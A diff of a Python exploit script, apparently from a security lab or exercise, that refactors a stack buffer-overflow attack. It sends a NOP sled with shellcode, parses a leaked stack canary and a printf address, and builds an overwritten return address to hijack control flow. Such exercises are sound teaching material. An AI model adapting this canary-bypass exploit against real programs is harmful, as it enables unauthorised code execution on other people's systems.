@@ -16,23 +16,15 @@ def int_to_bytes(x: int) -> str:
 
 # Program start:
 p.start()
-nop = 256 - len(SHELLCODE)
-p.send('\x90' * nop + SHELLCODE)
+p.send("\x90" * (256 - len(SHELLCODE)) + SHELLCODE)
 
 # Example receive:
-p.recvline()[28:]
-
-# assert p.recv(5) == 'test\n'
+_         = p.recvline()[28:]
 canaryraw = p.recvline()[30:]
-# print(canaryraw)
 printfraw = p.recvline()[35:]
 
-canaryint = int(canaryraw, 16)
-printfint = int(printfraw, 16)
-retint = printfint + 41
-
-canary = int_to_bytes(canaryint)
-retaddr = int_to_bytes(retint)
+canary  = int_to_bytes(int(canaryraw, 16))
+retaddr = int_to_bytes(int(printfraw, 16) + 41)
 p.send(canary * 4 + retaddr)
 
 ### YOUR CODE ENDS HERE ###
